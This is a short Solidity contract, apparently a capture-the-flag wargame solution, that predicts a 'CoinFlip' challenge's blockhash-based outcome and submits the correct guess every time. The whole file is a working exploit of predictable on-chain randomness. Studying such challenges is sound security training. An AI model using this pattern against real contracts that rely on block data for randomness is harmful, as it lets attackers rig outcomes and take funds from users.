pragma solidity ^0.8.21;

interface ICoinFlipChallenge {
  function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
    ICoinFlipChallenge private challenge;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    constructor(address _challengeAddress) {
      challenge = ICoinFlipChallenge(_challengeAddress);
    }

    function crystalBall() external returns (bool) {
      // do the same calculation as CoinFlip contract
      uint256 blockValue = uint256(blockhash(block.number - 1));
      uint256 coinFlip = blockValue / FACTOR;
      bool guess = coinFlip == 1 ? true : false;
      // submit guess to challenge
      bool success = challenge.flip(guess);
      return success;
    }
    
    receive() external payable {}
}
